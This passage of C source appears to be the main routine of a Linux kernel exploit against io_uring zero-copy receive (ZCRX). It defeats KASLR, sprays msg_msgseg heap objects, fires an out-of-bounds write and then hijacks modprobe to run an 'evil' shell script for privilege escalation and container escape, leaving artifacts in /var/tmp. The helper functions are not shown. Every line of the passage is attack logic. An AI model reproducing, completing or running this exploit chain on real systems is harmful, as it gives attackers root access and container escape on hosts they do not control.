    printf("\n");
    struct ksyms k = read_kaslr();

    if (env_only) {
        printf("\n[*] env mode, stopping here\n");
        return 0;
    }

    write_evil_sh(evil);
    time_t t0 = time(NULL);

    printf("\n");
    spray_msg_msgseg();

    printf("\n[*] registering ZCRX IFQ (kmalloc-%u, %u niovs)\n",
           AREA_NIOVS * 4, AREA_NIOVS);
    struct uring u = uring_open();
    struct zctx  z = zcrx_register(u.fd, ifname);

    if (!z.valid) {
        printf("[-] IFQ failed -- OOB cannot fire\n\n");
        analyze_write_target(&k, evil);
        printf("\n");
        trigger_modprobe(t0);
        goto cleanup;
    }

    oob_trigger(ifname, &u, &z);

    printf("\n");
    int hit = detect_corruption();
    if (hit >= 0)
        printf("[+] OOB confirmed: msg_msgseg.next[0:4] overwritten\n");

    printf("\n");
    bool write_ok = analyze_write_target(&k, evil);

    printf("\n");
    if (write_ok) {
        trigger_modprobe(t0);
        escalate(t0);
    } else {
        printf("[*] write chain not complete, running trigger anyway\n");
        trigger_modprobe(t0);
    }

cleanup:
    for (int i = 0; i < g_nq; i++)
        if (g_qids[i] >= 0) msgctl(g_qids[i], IPC_RMID, NULL);
    free(g_leak);
    close(u.fd);

    printf("\n[*] done -- check /var/tmp/ for escape artifacts\n");
    return 0;
}
